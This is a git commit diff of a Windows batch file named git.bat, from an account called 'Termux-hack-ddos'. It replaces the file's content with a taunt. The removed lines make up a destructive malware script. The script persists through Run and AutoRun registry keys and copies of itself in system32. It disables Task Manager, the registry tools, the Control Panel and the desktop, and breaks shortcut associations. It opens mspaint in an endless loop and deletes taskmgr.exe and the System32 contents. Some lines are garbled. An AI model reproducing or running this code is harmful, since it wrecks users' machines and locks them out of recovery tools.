1b2ab051d1b4b29b0fd82ca1da25350f53bbb18d
Egor <130061558+Termux-hack-ddos@users.noreply.github.com>
2023-05-06 18:33:41 +0500

    Update git.bat

--- git.bat
+++ git.bat
@@ -1,35 +1,4 @@
-C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
-
-copy ""%0"" "%SystemRoot%\system32\git.bat"
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Filel" /t REG_SZ /d "%SystemRoot%\system32\git.bat" /f
-reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f
-
-Set WshShell = WScript.CreateObject("WScript.Shell") WshShell.SendKeys("%{Alt+F4}")
-color a
-
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Win32 /t REG_SZ /d C:\Windows\Win32.bat /f
-
-reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul
-
-reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
-
-reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul
-
-reg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer/v NoControlPanel /t REG_DWORD /d 1 /f >nul
-reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
-
-del "%SystemRoot%Cursors*.*" >nul
-:x
-Start mspaint
-goto x
-assoc .lnk=.txt
-copy ""%0"" "%SystemRoot%\system32\batinit.bat" >nul
-reg add "HKCU\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "%SystemRoot%\syste m32\git.bat" /f >nul
-
-Del C:\Windows\System32\taskmgr.exe
-
-timeout 60
-
-timeout 60 /nobreak
-
-Del C:/Windows/System32 /q
+you
+are 
+an
+idiot
